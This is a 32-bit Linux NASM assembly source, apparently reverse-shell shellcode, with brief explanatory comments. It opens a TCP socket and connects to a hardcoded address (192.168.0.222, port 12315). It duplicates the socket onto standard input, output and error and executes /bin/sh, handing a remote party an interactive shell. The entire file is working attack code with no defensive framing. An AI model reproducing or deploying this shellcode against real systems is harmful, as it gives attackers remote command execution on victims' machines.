;;; utils.s

%define htonl(x) (\
    (((x) & 0x000000ff) << 24) | \
    (((x) & 0x0000ff00) <<  8) | \
    (((x) & 0x00ff0000) >>  8) | \
    (((x) & 0xff000000) >> 24))
%define ip(a,b,c,d) htonl(a << 24 | b << 16 | c << 8 | d) ; ip(127,0,0,1)
%define htons(x) ((((x) & 0xff00) >> 8) | (((x) & 0x00ff) << 8))

%define IP   dword      ip(192,168,0,222) 
%define PORT word       htons(12315)	
%define AF_INET         2
%define SOCK_STREAM     1
%define ANY_PROTO       0
	
	;; Socketcall is the systemcall we use to manipulate sockets
	;; It is linux specific. Use man socketcall.
	;; first argument is an integer and second is an arg struct ptr

BITS 32
	global _start

_start:
	xor 	eax, eax
	mov 	ebx, eax
	push 	eax
	push 	byte SOCK_STREAM
	push 	byte AF_INET
	inc 	ebx			
	mov 	ecx, esp
	mov 	al, 102 
	int 	80h		;socket() ebx=1

	;eax has socket
	inc ebx
	
IPandPort:
	push 	IP
	push 	PORT
	push 	bx 				;bx=2 AF_INET
	mov 	ecx, esp
	push 	byte 0x10		;size of sockaddr
	push 	ecx
	push 	eax				;socket fd
	inc 	ebx				;ebx=3 connect()
	mov 	ecx, esp
	mov 	al, 102
	int 	80h

;;; connect reurns zero on success
	
	;; mov edi,eax		;connect fd
	pop 	ebx			;the top of the stack has our socket
	push 	byte 2
	pop 	ecx			;loop counter and fd arg for dup2

copy:
	mov 	al, 63
	int 	80h			;dup2(ebx,ecx)
;;; the system_call macro that takes an argument also zero is it out
;;; using extra bytes. We can save some space by assuming that
;;; dup2 won it error. 
	dec 	ecx
	jns 	copy
	
	;; Any local shellcode here

local32BinSh:
	; execve("/bin/sh", 0, 0)
	xor 	ecx, ecx
	xor 	edx, edx
	push 	edx
	push 	"//sh"
	push 	"/bin"
	mov 	ebx, esp
	xor 	eax, eax
	mov 	al, 0Bh
	int 	80h

 